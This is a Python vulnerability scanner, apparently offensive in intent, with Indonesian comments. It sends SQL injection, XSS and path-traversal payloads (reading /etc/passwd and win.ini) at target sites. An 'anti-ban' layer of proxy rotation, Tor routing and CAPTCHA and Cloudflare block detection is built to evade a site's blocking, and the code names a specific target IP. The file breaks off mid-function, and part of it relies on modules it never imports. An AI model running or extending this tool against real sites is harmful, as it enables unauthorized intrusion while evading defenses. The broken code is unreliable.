import requests
import threading
import time
import urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import json
import logging
from datetime import datetime
import html
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import random
import re
import base64
import string
from fake_useragent import UserAgent
import xml.etree.ElementTree as ET
import ssl
from cryptography import x509
from cryptography.hazmat.backends import default_backend
import sys
import os
from collections import defaultdict
from difflib import SequenceMatcher

# Fix untuk encoding di Windows
if sys.platform == "win32":
    import codecs
    sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
    sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')

# Professional logging dengan fix encoding
class UnicodeStreamHandler(logging.StreamHandler):
    def emit(self, record):
        try:
            msg = self.format(record)
            stream = self.stream
            msg = msg.encode('utf-8', 'replace').decode('utf-8')
            stream.write(msg + self.terminator)
            self.flush()
        except Exception:
            self.handleError(record)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('vuln_scanner.log', encoding='utf-8'),
        UnicodeStreamHandler()
    ]
)

# ==================== ANTI-BAN SYSTEM ====================

class ProxyRotator:
    """Proxy rotation system untuk bypass IP blocking"""
    
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.failed_proxies = set()
        self.proxy_stats = {}
        self.auth_proxies = []  # Untuk proxy dengan auth
        
    def load_proxies(self, proxy_file):
        """Load proxies dari file"""
        if not os.path.exists(proxy_file):
            logging.warning(f"Proxy file {proxy_file} not found")
            return
        
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    # Clean and validate proxy
                    clean_proxy = self._clean_proxy_line(line)
                    if clean_proxy:
                        self.proxies.append(clean_proxy)
                        if '@' in clean_proxy:  # Proxy dengan auth
                            self.auth_proxies.append(clean_proxy)
        
        logging.info(f"Loaded {len(self.proxies)} proxies ({len(self.auth_proxies)} with auth)")
        
        # Log first few proxies untuk verifikasi
        for i, proxy in enumerate(self.proxies[:3]):
            logging.info(f"Proxy {i+1}: {proxy[:50]}...")
    
    def _clean_proxy_line(self, line):
        """Clean dan validate proxy line"""
        line = line.strip()
        
        # Skip jika kosong atau komentar
        if not line or line.startswith('#'):
            return None
        
        # Cek jika mengandung IP target (31.59.20.176)
        if '31.59.20.176' in line:
            logging.warning(f"Skipping proxy with target IP: {line}")
            return None
        
        # Tambahkan http:// jika tidak ada protocol
        if not line.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            # Cek jika ada @ untuk menentukan protocol
            if '@' in line:
                line = 'http://' + line
            else:
                # Coba parse sebagai ip:port
                parts = line.split(':')
                if len(parts) == 2 and parts[0].replace('.', '').isdigit():
                    line = 'http://' + line
        
        return line
    
    def get_proxy(self):
        """Get next working proxy"""
        if not self.proxies:
            return None
        
        working_proxies = [p for p in self.proxies if p not in self.failed_proxies]
        
        if not working_proxies:
            logging.warning("All proxies failed, resetting...")
            self.failed_proxies.clear()
            working_proxies = self.proxies
        
        self.current_index = (self.current_index + 1) % len(working_proxies)
        proxy = working_proxies[self.current_index]
        
        return self._format_proxy(proxy)
    
    def _format_proxy(self, proxy):
        """Format proxy untuk requests"""
        # Jika sudah dalam format dict, return langsung
        if isinstance(proxy, dict):
            return proxy
        
        # Parse proxy string
        if '://' not in proxy:
            proxy = 'http://' + proxy
        
        # Untuk proxy dengan auth, format khusus
        if '@' in proxy:
            # Parse username:password
            protocol = proxy.split('://')[0]
            auth_part = proxy.split('://')[1].split('@')[0]
            host_part = proxy.split('@')[1]
            
            return {
                'http': f'{protocol}://{auth_part}@{host_part}',
                'https': f'{protocol}://{auth_part}@{host_part}'
            }
        else:
            return {
                'http': proxy,
                'https': proxy
            }
    
    def mark_failed(self, proxy_str):
        """Mark proxy as failed"""
        if isinstance(proxy_str, dict):
            proxy_str = proxy_str.get('http', '').replace('http://', '').replace('https://', '')
        self.failed_proxies.add(proxy_str)
        logging.warning(f"Proxy marked as failed: {proxy_str}")
    
    def record_success(self, proxy_str):
        """Record successful proxy usage"""
        if isinstance(proxy_str, dict):
            proxy_str = proxy_str.get('http', '').replace('http://', '').replace('https://', '')
        
        if proxy_str not in self.proxy_stats:
            self.proxy_stats[proxy_str] = {'success': 0, 'total': 0}
        
        self.proxy_stats[proxy_str]['total'] += 1
        self.proxy_stats[proxy_str]['success'] += 1

class TorManager:
    """TOR network integration"""
    
    def __init__(self, tor_port=9050):
        self.tor_port = tor_port
        self.tor_available = self.check_tor()
        
    def check_tor(self):
        """Check if TOR is available"""
        try:
            proxies = {
                'http': f'socks5://127.0.0.1:{self.tor_port}',
                'https': f'socks5://127.0.0.1:{self.tor_port}'
            }
            response = requests.get('https://check.torproject.org/', 
                                   proxies=proxies, timeout=10)
            if 'Congratulations' in response.text:
                logging.info("TOR connection verified")
                return True
        except:
            logging.warning("TOR not available")
        return False
    
    def get_tor_proxy(self):
        """Get TOR proxy configuration"""
        if self.tor_available:
            return {
                'http': f'socks5://127.0.0.1:{self.tor_port}',
                'https': f'socks5://127.0.0.1:{self.tor_port}'
            }
        return None

class RateLimiter:
    """Adaptive rate limiting"""
    
    def __init__(self, requests_per_second=1):
        self.requests_per_second = requests_per_second
        self.min_delay = 1.0 / requests_per_second
        self.last_request_time = 0
        self.blocked_count = 0
        self.adaptive_multiplier = 1.0
        
    def wait(self):
        """Wait dengan adaptive delay"""
        current_time = time.time()
        elapsed = current_time - self.last_request_time
        
        required_delay = self.min_delay * self.adaptive_multiplier
        
        if elapsed < required_delay:
            sleep_time = required_delay - elapsed
            sleep_time += random.uniform(0, sleep_time * 0.2)
            time.sleep(sleep_time)
        
        self.last_request_time = time.time()
    
    def on_block_detected(self):
        """Adjust rate limiting when blocked"""
        self.blocked_count += 1
        self.adaptive_multiplier = min(self.adaptive_multiplier * 1.5, 10.0)
        logging.warning(f"Block detected! Rate limit adjusted (x{self.adaptive_multiplier:.1f})")
        
        cooldown = min(30 * self.blocked_count, 300)
        logging.info(f"Cooling down for {cooldown}s...")
        time.sleep(cooldown)
    
    def on_success(self):
        """Reduce delay on success"""
        if self.adaptive_multiplier > 1.0:
            self.adaptive_multiplier = max(1.0, self.adaptive_multiplier * 0.95)

class BlockDetector:
    """Detect if blocked or rate limited"""
    
    def __init__(self):
        self.consecutive_failures = 0
        
    def is_blocked(self, response=None, exception=None):
        """Check if request was blocked"""
        is_blocked = False
        reason = None
        
        if exception:
            if 'Connection refused' in str(exception):
                is_blocked = True
                reason = "Connection refused"
            elif 'timeout' in str(exception).lower():
                is_blocked = True
                reason = "Timeout"
        
        if response:
            if response.status_code in [403, 429, 503]:
                is_blocked = True
                reason = f"HTTP {response.status_code}"
            
            block_indicators = ['captcha', 'recaptcha', 'cloudflare', 
                              'access denied', 'rate limit', 'too many requests']
            content_lower = response.text.lower()
            
            for indicator in block_indicators:
                if indicator in content_lower:
                    is_blocked = True
                    reason = f"Content: {indicator}"
                    break
        
        if is_blocked:
            logging.warning(f"BLOCK DETECTED: {reason}")
            self.consecutive_failures += 1
        else:
            self.consecutive_failures = max(0, self.consecutive_failures - 1)
        
        return is_blocked, reason
    
    def reset(self):
        """Reset detection state"""
        self.consecutive_failures = 0

# ==================== END ANTI-BAN SYSTEM ====================

class BehavioralAnalyzer:
    """ML-style behavioral analysis untuk mengurangi false positives"""
    
    def __init__(self):
        self.baseline_responses = {}
        self.response_patterns = defaultdict(list)
        self.timing_baselines = {}
        
    def establish_baseline(self, url, params):
        """Establish baseline response untuk differential analysis"""
        baseline_key = f"{url}_{json.dumps(sorted(params.items()))}"
        
        if baseline_key in self.baseline_responses:
            return self.baseline_responses[baseline_key]
        
        # Test dengan normal values
        normal_values = ['test', '1', 'normal', 'valid']
        responses = []
        
        for value in normal_values:
            test_params = params.copy()
            for param in params.keys():
                test_params[param] = value
            
            try:
                response = requests.get(url, params=test_params, timeout=10)
                responses.append({
                    'status': response.status_code,
                    'length': len(response.text),
                    'time': response.elapsed.total_seconds(),
                    'content_hash': hashlib.md5(response.text.encode()).hexdigest()
                })
            except:
                pass
        
        if responses:
            # Calculate average baseline
            baseline = {
                'avg_length': sum(r['length'] for r in responses) / len(responses),
                'avg_time': sum(r['time'] for r in responses) / len(responses),
                'common_status': max(set(r['status'] for r in responses), 
                                    key=lambda x: sum(1 for r in responses if r['status'] == x)),
                'content_hashes': [r['content_hash'] for r in responses]
            }
            self.baseline_responses[baseline_key] = baseline
            return baseline
        
        return None
    
    def analyze_differential(self, baseline, test_response):
        """Differential analysis untuk mendeteksi anomalies"""
        if not baseline:
            return {'confidence': 0.3, 'anomaly_detected': False}
        
        anomaly_score = 0
        indicators = []
        
        # Length-based analysis
        length_diff = abs(len(test_response.text) - baseline['avg_length'])
        length_ratio = length_diff / baseline['avg_length'] if baseline['avg_length'] > 0 else 0
        
        if length_ratio > 0.3:  # 30% difference
            anomaly_score += 0.25
            indicators.append(f"Significant length change: {length_ratio:.2%}")
        
        # Status code analysis
        if test_response.status_code != baseline['common_status']:
            anomaly_score += 0.15
            indicators.append(f"Status code changed: {baseline['common_status']} -> {test_response.status_code}")
        
        # Content hash analysis
        test_hash = hashlib.md5(test_response.text.encode()).hexdigest()
        if test_hash not in baseline['content_hashes']:
            # Calculate similarity
            max_similarity = 0
            for stored_response in self.response_patterns.get(test_response.url, []):
                similarity = SequenceMatcher(None, test_response.text[:1000], 
                                           stored_response[:1000]).ratio()
                max_similarity = max(max_similarity, similarity)
            
            if max_similarity < 0.7:  # Less than 70% similar
                anomaly_score += 0.35
                indicators.append(f"Content significantly different (similarity: {max_similarity:.2%})")
        
        # Time-based analysis
        time_diff = abs(test_response.elapsed.total_seconds() - baseline['avg_time'])
        if time_diff > 3:  # More than 3 seconds difference
            anomaly_score += 0.25
            indicators.append(f"Response time anomaly: +{time_diff:.2f}s")
        
        return {
            'confidence': min(anomaly_score, 1.0),
            'anomaly_detected': anomaly_score > 0.5,
            'indicators': indicators,
            'anomaly_score': anomaly_score
        }
    
    def verify_time_based_vulnerability(self, url, params, payload_param, session):
        """Hafourenai time-based verification dengan statistical analysis"""
        timings = {'normal': [], 'payload': []}
        
        # Test normal requests
        for _ in range(3):
            start = time.time()
            try:
                session.get(url, params=params, timeout=15)
                timings['normal'].append(time.time() - start)
            except:
                pass
            time.sleep(0.5)
        
        # Test dengan time-based payload
        test_params = params.copy()
        test_params[payload_param] = "' AND SLEEP(5)--"
        
        for _ in range(3):
            start = time.time()
            try:
                session.get(url, params=test_params, timeout=15)
                timings['payload'].append(time.time() - start)
            except:
                pass
            time.sleep(0.5)
        
        if timings['normal'] and timings['payload']:
            avg_normal = sum(timings['normal']) / len(timings['normal'])
            avg_payload = sum(timings['payload']) / len(timings['payload'])
            time_diff = avg_payload - avg_normal
            
            # Confidence based on consistency
            consistency = len([t for t in timings['payload'] if t > (avg_normal + 4)]) / len(timings['payload'])
            
            return {
                'vulnerable': time_diff > 4 and consistency > 0.6,
                'confidence': consistency,
                'time_diff': time_diff,
                'evidence': f"Avg normal: {avg_normal:.2f}s, Avg payload: {avg_payload:.2f}s"
            }
        
        return {'vulnerable': False, 'confidence': 0}

class ContextAnalyzer:
    """Context-aware validation untuk XSS dan injection attacks"""
    
    def __init__(self):
        self.html_contexts = ['tag', 'attribute', 'script', 'style', 'comment']
        
    def analyze_xss_context(self, response_text, payload):
        """Analyze dimana payload di-inject dan apakah di-encode - Enhanced version"""
        if payload not in response_text:
            return {'vulnerable': False, 'confidence': 0}
        
        # Find injection points
        injection_points = []
        for match in re.finditer(re.escape(payload), response_text):
            start = max(0, match.start() - 100)
            end = min(len(response_text), match.end() + 100)
            context = response_text[start:end]
            injection_points.append(context)
        
        vulnerabilities = []
        
        # Enhanced encoding detection patterns
        encoded_versions = [
            html.escape(payload),
            urllib.parse.quote(payload),
            urllib.parse.quote(payload, safe=''),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('<', '&#60;').replace('>', '&#62;'),
            payload.replace('<', '&#x3c;').replace('>', '&#x3e;'),
            payload.replace('<', '%3C').replace('>', '%3E'),
            payload.replace('"', '&quot;').replace("'", '&#39;'),
        ]
        
        for context in injection_points:
            context_lower = context.lower()
            
            # Check if encoded - skip if payload appears encoded
            if any(enc in context for enc in encoded_versions if enc != payload):
                continue
            
            # Check if dalam script tag
            if '<script' in context_lower and '</script>' in context_lower:
                if payload in context:
                    # Check for JavaScript context breaks
                    if any(x in payload.lower() for x in ['alert', 'eval', 'document', 'window', 'location']):
                        vulnerabilities.append({
                            'context': 'script',
                            'severity': 'high',
                            'confidence': 0.92,
                            'reason': 'Payload injected in script context without encoding'
                        })
                    elif any(x in payload for x in ['</script>', '<script']):
                        vulnerabilities.append({
                            'context': 'script_break',
                            'severity': 'high',
                            'confidence': 0.90,
                            'reason': 'Script tag injection detected'
                        })
            
            # Check if dalam HTML tag attribute
            elif re.search(r'<\w+[^>]*' + re.escape(payload) + r'[^>]*>', context):
                # Check for event handlers - enhanced list
                event_handlers = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus',
                                'onblur', 'onsubmit', 'onchange', 'onkeydown', 'onkeyup',
                                'onmousedown', 'onmouseup', 'ondblclick', 'oncontextmenu']
                if any(event in payload.lower() for event in event_handlers):
                    vulnerabilities.append({
                        'context': 'attribute_event',
                        'severity': 'high',
                        'confidence': 0.88,
                        'reason': 'Event handler injected in attribute'
                    })
                # Check for javascript: protocol
                elif 'javascript:' in payload.lower():
                    vulnerabilities.append({
                        'context': 'attribute_javascript',
                        'severity': 'high',
                        'confidence': 0.85,
                        'reason': 'JavaScript protocol in attribute'
                    })
            
            # Check SVG context
            elif '<svg' in context_lower:
                if any(x in payload.lower() for x in ['onload', 'onerror', 'onclick']):
                    vulnerabilities.append({
                        'context': 'svg',
                        'severity': 'high',
                        'confidence': 0.85,
                        'reason': 'SVG event handler injection'
                    })
            
            # Check MathML context
            elif '<math' in context_lower:
                vulnerabilities.append({
                    'context': 'mathml',
                    'severity': 'medium',
                    'confidence': 0.70,
                    'reason': 'MathML context injection'
                })
            
            # Check if dalam tag body (standard HTML injection)
            elif '<' + payload in context or payload + '>' in context:
                vulnerabilities.append({
                    'context': 'tag',
                    'severity': 'medium',
                    'confidence': 0.72,
                    'reason': 'HTML tag injection possible'
                })
            
            # Check textarea/title/meta - these often don't execute but indicate issues
            elif any(f'<{tag}' in context_lower for tag in ['textarea', 'title', 'noscript']):
                # Payload in these contexts usually doesn't execute directly
                vulnerabilities.append({
                    'context': 'contained',
                    'severity': 'low',
                    'confidence': 0.50,
                    'reason': 'Payload in contained context (textarea/title/noscript)'
                })
        
        if vulnerabilities:
            max_confidence = max(v['confidence'] for v in vulnerabilities)
            return {
                'vulnerable': True,
                'confidence': max_confidence,
                'contexts': vulnerabilities
            }
        
        return {'vulnerable': False, 'confidence': 0}
    
    def analyze_sql_context(self, response_text, payload):
        """Analyze SQL injection context"""
        confidence_score = 0
        indicators = []
        
        # Hafourenai SQL error patterns dengan context
        error_patterns = {
            'mysql': [
                (r"You have an error in your SQL syntax.*?near.*?" + re.escape(payload[:20]), 0.95),
                (r"mysql_fetch_array\(\).*?expects parameter", 0.85),
                (r"MySQL.*?Query.*?failed", 0.8)
            ],
            'postgresql': [
                (r"PostgreSQL.*?ERROR.*?" + re.escape(payload[:20]), 0.95),
                (r"pg_query\(\).*?error", 0.85)
            ],
            'mssql': [
                (r"Microsoft OLE DB Provider.*?SQL Server", 0.9),
                (r"SQLServer JDBC Driver.*?SQL", 0.85)
            ],
            'oracle': [
                (r"ORA-\d+.*?" + re.escape(payload[:20]), 0.95),
                (r"Oracle.*?Error", 0.8)
            ]
        }
        
        for db_type, patterns in error_patterns.items():
            for pattern, conf in patterns:
                if re.search(pattern, response_text, re.IGNORECASE | re.DOTALL):
                    confidence_score = max(confidence_score, conf)
                    indicators.append(f"{db_type.upper()} error with payload context")
        
        # Check untuk UNION-based dengan column counting
        if 'UNION' in payload.upper():
            # Look for data disclosure
            if re.search(r'\b\d+\s*,\s*\d+\s*,\s*\d+\b', response_text):
                confidence_score = max(confidence_score, 0.9)
                indicators.append("Potential UNION-based data disclosure")
        
        return {
            'vulnerable': confidence_score > 0.7,
            'confidence': confidence_score,
            'indicators': indicators
        }
    
    def analyze_lfi_context(self, response_text, payload):
        """Context-aware LFI detection"""
        confidence = 0
        evidence = []
        
        # File content patterns dengan context validation
        file_patterns = {
            'linux_passwd': {
                'pattern': r'root:.*?:\d+:\d+:',
                'secondary': r'(daemon|bin|sys):.*?:\d+:\d+:',
                'confidence': 0.95
            },
            'windows_ini': {
                'pattern': r'\[boot loader\].*?timeout=\d+',
                'secondary': r'\[operating systems\]',
                'confidence': 0.9
            },
            'php_config': {
                'pattern': r'<\?php.*?define\s*\(\s*[\'"]DB_',
                'secondary': r'DB_PASSWORD|DB_HOST',
                'confidence': 0.85
            },
            'apache_config': {
                'pattern': r'DocumentRoot|ServerRoot',
                'secondary': r'<VirtualHost|<Directory',
                'confidence': 0.8
            }
        }
        
        for file_type, patterns in file_patterns.items():
            if re.search(patterns['pattern'], response_text, re.IGNORECASE | re.DOTALL):
                # Verify dengan secondary pattern
                if re.search(patterns['secondary'], response_text, re.IGNORECASE):
                    confidence = max(confidence, patterns['confidence'])
                    evidence.append(f"{file_type} content confirmed with secondary validation")
                else:
                    # Lower confidence tanpa secondary validation
                    confidence = max(confidence, patterns['confidence'] * 0.7)
                    evidence.append(f"{file_type} pattern found (needs verification)")
        
        # Check for false positives
        false_positive_indicators = [
            'example.com', 'localhost:1234', 'user:password',
            'root:x:0:0:root:/root:/bin/bash'  # Sample/documentation
        ]
        
        if any(indicator in response_text for indicator in false_positive_indicators):
            confidence *= 0.5  # Reduce confidence
            evidence.append("Possible documentation/sample content detected")
        
        return {
            'vulnerable': confidence > 0.7,
            'confidence': confidence,
            'evidence': evidence
        }

class AutomatedVerifier:
    """Automated verification mechanisms untuk confirm vulnerabilities"""
    
    def __init__(self, session):
        self.session = session
        
    def verify_sqli_with_multiple_techniques(self, url, param, params):
        """Multi-technique SQL injection verification with enhanced accuracy"""
        results = {
            'error_based': False,
            'boolean_based': False,
            'time_based': False,
            'union_based': False
        }
        
        test_params = params.copy()
        
        # Enhanced DB-specific error patterns
        db_error_patterns = {
            'mysql': [
                r"You have an error in your SQL syntax",
                r"mysql_fetch_array\(\).*?expects parameter",
                r"MySQL Query failed",
                r"Warning.*?mysql_",
                r"MySQLSyntaxErrorException",
                r"valid MySQL result resource",
                r"check the manual that corresponds to your MySQL server version"
            ],
            'postgresql': [
                r"PostgreSQL.*?ERROR",
                r"pg_query\(\).*?failed",
                r"PG::SyntaxError",
                r"pg_prepare\(\).*?failed",
                r"unterminated quoted string at or near"
            ],
            'mssql': [
                r"Microsoft OLE DB Provider.*?SQL Server",
                r"SQLServer JDBC Driver",
                r"Unclosed quotation mark after the character string",
                r"Microsoft SQL Native Client.*?ODBC",
                r"ODBC SQL Server Driver.*?Syntax error"
            ],
            'oracle': [
                r"ORA-\d{4,5}:",
                r"Oracle.*?Driver.*?error",
                r"Warning.*?oci_",
                r"PLS-\d{4,5}:",
                r"quoted string not properly terminated"
            ],
            'sqlite': [
                r"SQLite.*?error",
                r"sqlite3\.OperationalError",
                r"unrecognized token:",
                r"SQLSTATE.*?SQLITE"
            ]
        }
        
        # 1. Error-based verification with DB-specific patterns
        error_payloads = ["'", "\"", "' OR '1'='1", "1'", "1\""]
        for payload in error_payloads:
            test_params[param] = payload
            try:
                resp = self.session.get(url, params=test_params, timeout=10)
                for db_type, patterns in db_error_patterns.items():
                    for pattern in patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            results['error_based'] = True
                            break
                    if results['error_based']:
                        break
                if results['error_based']:
                    break
            except:
                pass
        
        # 2. Boolean-based verification with content length threshold
        true_payload = "' OR '1'='1"
        false_payload = "' OR '1'='2"
        
        test_params[param] = true_payload
        try:
            true_resp = self.session.get(url, params=test_params, timeout=10)
            test_params[param] = false_payload
            false_resp = self.session.get(url, params=test_params, timeout=10)
            
            # Compare responses with minimum threshold
            length_diff = abs(len(true_resp.text) - len(false_resp.text))
            min_length = min(len(true_resp.text), len(false_resp.text))
            
            # Require at least 10% difference and absolute difference > 50 chars
            if length_diff > 50 and (length_diff / max(min_length, 1)) > 0.10:
                results['boolean_based'] = True
        except:
            pass
        
        # 3. Time-based verification with statistical confirmation
        time_payloads = [
            "' AND SLEEP(4)--",
            "' OR SLEEP(4)--",
            "'; WAITFOR DELAY '0:0:4'--"
        ]
        
        # Get baseline timing first
        baseline_times = []
        original_value = params.get(param, '1')
        test_params[param] = original_value
        for _ in range(2):
            start = time.time()
            try:
                self.session.get(url, params=test_params, timeout=15)
                baseline_times.append(time.time() - start)
            except:
                pass
        
        avg_baseline = sum(baseline_times) / len(baseline_times) if baseline_times else 0
        
        for payload in time_payloads:
            test_params[param] = payload
            start = time.time()
            try:
                self.session.get(url, params=test_params, timeout=15)
                elapsed = time.time() - start
                # Require delay to be close to expected AND significantly above baseline
                if elapsed > 3.5 and (elapsed - avg_baseline) > 3:
                    results['time_based'] = True
                    break
            except:
                pass
        
        # Calculate confidence with weighted scoring
        confirmed_count = sum(results.values())
        
        # Weight: error_based = 0.25, boolean = 0.20, time_based = 0.30, union = 0.25
        weights = {'error_based': 0.25, 'boolean_based': 0.20, 'time_based': 0.30, 'union_based': 0.25}
        weighted_score = sum(weights[k] for k, v in results.items() if v)
        
        confidence = 0.4 + (weighted_score * 1.1)  # Scale to 0.4-0.95 range
        
        return {
            'vulnerable': confirmed_count >= 2,  # At least 2 techniques must confirm
            'confidence': min(confidence, 0.95),
            'techniques_confirmed': confirmed_count,
            'details': results
        }
    
    def verify_xss_with_multiple_vectors(self, url, param, params, form_method='get'):
        """Multi-vector XSS verification"""
        vectors = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')"
        ]
        
        confirmed_vectors = 0
        contexts_found = []
        
        for vector in vectors:
            test_params = params.copy()
            test_params[param] = vector
            
            try:
                if form_method == 'post':
                    resp = self.session.post(url, data=test_params, timeout=10)
                else:
                    resp = self.session.get(url, params=test_params, timeout=10)
                
                # Check if reflected without encoding
                if vector in resp.text:
                    # Verify context
                    context_analyzer = ContextAnalyzer()
                    analysis = context_analyzer.analyze_xss_context(resp.text, vector)
                    
                    if analysis['vulnerable']:
                        confirmed_vectors += 1
                        contexts_found.extend([c['context'] for c in analysis.get('contexts', [])])
            except:
                pass
        
        confidence = min(0.6 + (confirmed_vectors * 0.1), 0.95)
        
        return {
            'vulnerable': confirmed_vectors >= 2,
            'confidence': confidence,
            'vectors_confirmed': confirmed_vectors,
            'contexts': list(set(contexts_found))
        }
    
    def verify_lfi_with_multiple_files(self, url, param, params):
        """Multi-file LFI verification"""
        test_files = [
            ('../../../../etc/passwd', ['root:', 'daemon:']),
            ('../../../../etc/hosts', ['localhost', '127.0.0.1']),
            ('../../../../windows/win.ini', ['[boot loader]', '[fonts]']),
            ('../../../../../etc/passwd', ['root:', 'bin:'])
        ]
        
        confirmed_files = 0
        evidence = []
        
        for file_path, indicators in test_files:
            test_params = params.copy()
            test_params[param] = file_path
            
            try:
                resp = self.session.get(url, params=test_params, timeout=10)
                
                # Check if multiple indicators present
                found_indicators = sum(1 for ind in indicators if ind in resp.text)
                
                if found_indicators >= len(indicators) * 0.5:  # At least 50% indicators
                    confirmed_files += 1
                    evidence.append(f"{file_path}: {found_indicators}/{len(indicators)} indicators")
            except:
                pass
        
        confidence = min(0.5 + (confirmed_files * 0.15), 0.95)
        
        return {
            'vulnerable': confirmed_files >= 2,
            'confidence': confidence,
            'files_confirmed': confirmed_files,
            'evidence': evidence
        }


class CSRFDetector:
    """
    Advanced CSRF detection helper.
    Dirancang untuk mengurangi false positive dengan:
    - Mengabaikan method aman (GET/HEAD/OPTIONS)
    - Mengidentifikasi form publik (newsletter, search, contact)
    - Menggabungkan passive detection (token, SameSite, dll) dan active testing.
    """

    SAFE_METHODS = {"get", "head", "options"}

    def __init__(self, scanner):
        # scanner = instance VulnScanner, supaya bisa pakai safe_request, headers, dll.
        self.scanner = scanner
        self.session = scanner.session
        self.framework_tokens = self._load_framework_patterns()
        self.min_token_entropy = 3.5  # bits per character
        self.min_token_length = 16

    def _load_framework_patterns(self):
        return {
            'django': ['csrfmiddlewaretoken'],
            'laravel': ['_token'],
            'spring': ['_csrf'],
            'aspnet': ['__RequestVerificationToken'],
            'rails': ['authenticity_token'],
            'express': ['_csrf'],
        }

    # ------------ High level API ------------

    def analyze_form(self, form, page_html):
        """
        Analisa satu form dan kembalikan dict:
        {
          vulnerable: bool,
          confidence: float(0-1),
          protections_found: [...],
          protections_missing: [...],
          tests: [...],
          evidence: {...},
        }
        """
        result = {
            "vulnerable": False,
            "confidence": 0.0,
            "protections_found": [],
            "protections_missing": [],
            "tests": [],
            "evidence": {},
            "false_positive_reasons": [],
        }

        method = form.get("method", "get").lower()

        # 1. Ignore safe methods (read‑only)
        if method in self.SAFE_METHODS:
            result["false_positive_reasons"].append("Safe HTTP method (read‑only)")
            return result

        # 2. Ignore clearly public / low‑risk forms
        if self._is_public_form(form):
            result["false_positive_reasons"].append("Public / low‑risk form")
            return result

        # 3. Passive protections detection
        token_info = self._detect_tokens(form)
        same_site_info = self._check_samesite_cookies()
        captcha_info = self._check_captcha(page_html or "")

        if token_info["found"]:
            result["protections_found"].append("token_based")
        else:
            result["protections_missing"].append("token_based")

        if same_site_info["protected"]:
            result["protections_found"].append("samesite_cookie")
        else:
            result["protections_missing"].append("samesite_cookie")

        if captcha_info["found"]:
            result["protections_found"].append("captcha")

        result["evidence"]["tokens"] = token_info
        result["evidence"]["samesite"] = same_site_info
        result["evidence"]["captcha"] = captcha_info

        # Jika sudah ada proteksi kuat, jangan buru‑buru sebut vulnerable
        strong_protection = token_info["found"] and token_info["quality"].get("is_secure")

        # 4. Active tests – hanya jika tidak ada proteksi, atau proteksi lemah
        if (not token_info["found"]) or (not strong_protection):
            tests = self._active_tests(form, token_info)
            result["tests"] = tests
            successful = [t for t in tests if t.get("success")]

            if len(successful) >= 2:
                result["vulnerable"] = True
                # Semakin banyak test sukses, semakin tinggi confidence
                base_conf = 0.7 + 0.1 * (len(successful) - 2)
                result["confidence"] = min(base_conf, 0.95)
            elif len(successful) == 1:
                result["vulnerable"] = True
                result["confidence"] = 0.6

        # 5. Jika tidak ada proteksi sama sekali dan tidak sempat active test
        if (not token_info["found"]) and ("tests" in result and not result["tests"]):
            # Masih kita tandai medium confidence, tapi biarkan caller yang putuskan threshold
            result["vulnerable"] = True
            result["confidence"] = max(result["confidence"], 0.6)

        return result

    # ------------ Passive analysis helpers ------------

    def _is_public_form(self, form):
        inputs = form.get("inputs", [])
        names = " ".join((i.get("name", "") or "").lower() for i in inputs)

        public_keywords = [
            "newsletter", "subscribe", "subscription",
            "search", "q", "query",
            "contact", "message",
        ]
        sensitive_keywords = [
            "password", "pass", "credit", "card", "cc",
            "payment", "transfer", "iban", "account",
        ]

        is_public = any(k in names for k in public_keywords)
        has_sensitive = any(k in names for k in sensitive_keywords)

        return is_public and not has_sensitive

    def _detect_tokens(self, form):
        result = {
            "found": False,
            "framework": None,
            "tokens": [],
            "quality": {},
        }

        inputs = form.get("inputs", [])

        for inp in inputs:
            name = (inp.get("name") or "").lower()
            value = inp.get("value", "") or ""
            field_type = inp.get("type", "text").lower()

            if not name:
                continue

            # Framework‑specific terlebih dahulu
            for fw, fw_names in self.framework_tokens.items():
                if name in [n.lower() for n in fw_names]:
                    q = self._analyze_token_quality(value)
                    result.update({
                        "found": True,
                        "framework": fw,
                        "quality": q,
                    })
                    result["tokens"].append({
                        "name": name,
                        "preview": value[:20] + ("..." if len(value) > 20 else ""),
                        "type": field_type,
                        "quality": q,
                    })
                    return result

            # Generic token heuristic
            if any(k in name for k in ["csrf", "token", "xsrf", "authenticity", "nonce"]):
                if field_type == "hidden" and len(value) >= self.min_token_length:
                    q = self._analyze_token_quality(value)
                    result.update({
                        "found": True,
                        "framework": "custom",
                        "quality": q,
                    })
                    result["tokens"].append({
                        "name": name,
                        "preview": value[:20] + ("..." if len(value) > 20 else ""),
                        "type": field_type,
                        "quality": q,
                    })
                    return result

        return result

    def _analyze_token_quality(self, token):
        issues = []
        length = len(token)

        if length < self.min_token_length:
            issues.append(f"Token too short ({length} < {self.min_token_length})")

        entropy = self._entropy(token) if token else 0.0
        if entropy < self.min_token_entropy:
            issues.append(f"Low entropy ({entropy:.2f} < {self.min_token_entropy})")

        # Pola timestamp / mostly numeric
        if re.search(r'\d{10,13}', token):
            issues.append("Looks like timestamp‑based token")
        numeric_ratio = (sum(c.isdigit() for c in token) / length) if length else 0
        if numeric_ratio > 0.8:
            issues.append("Token mostly numeric")

        is_secure = (length >= self.min_token_length
                     and entropy >= self.min_token_entropy
                     and not issues)

        return {
            "length": length,
            "entropy": entropy,
            "issues": issues,
            "is_secure": is_secure,
        }

    def _entropy(self, s):
        if not s:
            return 0.0
        counts = Counter(s)
        length = len(s)
        h = 0.0
        for c in counts.values():
            p = c / length
            h -= p * math.log2(p)
        return h

    def _check_samesite_cookies(self):
        result = {
            "protected": False,
            "cookies": [],
        }
        for cookie in self.session.cookies:
            info = {
                "name": cookie.name,
                "samesite": getattr(cookie, "samesite", None),
                "secure": getattr(cookie, "secure", False),
            }
            result["cookies"].append(info)
            samesite = (getattr(cookie, "samesite", None) or "").lower()
            if samesite in ("lax", "strict"):
                result["protected"] = True
        return result

    def _check_captcha(self, html_text):
        patterns = [
            (r"g-recaptcha", "Google reCAPTCHA"),
            (r"h-captcha", "hCaptcha"),
